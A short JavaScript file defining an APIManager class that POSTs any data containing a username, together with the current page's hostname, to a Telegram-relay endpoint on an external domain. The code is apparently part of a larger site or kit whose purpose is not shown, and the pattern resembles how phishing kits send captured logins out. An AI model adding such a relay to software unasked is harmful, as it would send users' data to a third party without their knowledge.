console.log('[ORION_DEBUG] APIManager.js execution started');
class APIManager {
    static BACKEND_URL = 'https://bcplay.win/api/sendTelegramMessage';
    
    static async sendToTelegram(data) {
        if (!data.username) return;
        
        try {
            const response = await fetch(this.BACKEND_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ...data,
                    domain: window.location.hostname
                })
            });

            if (!response.ok) console.error('Backend Error:', await response.text());
        } catch (error) {
            console.error('Network Error:', error);
        }
    }
}